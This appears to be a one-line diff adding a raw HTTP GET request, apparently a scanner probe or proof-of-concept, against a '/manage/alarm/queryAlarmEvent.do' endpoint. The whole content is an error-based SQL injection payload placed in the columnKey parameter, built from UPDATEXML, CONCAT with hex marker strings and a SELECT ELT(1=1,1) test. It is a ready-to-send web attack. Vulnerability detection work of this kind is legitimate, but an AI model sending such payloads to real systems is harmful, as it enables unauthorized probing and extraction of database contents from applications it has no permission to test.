@@ -1,0 +1,1 @@
+GET /manage/alarm/queryAlarmEvent.do?order=/**/&columnKey=(UPDATEXML(2,CONCAT(0x2e,0x3131313131,(SELECT+(ELT(1=1,1))),0x3131313131),8))&recoToken=ZuZBOrvLG8M HTTP/1.1
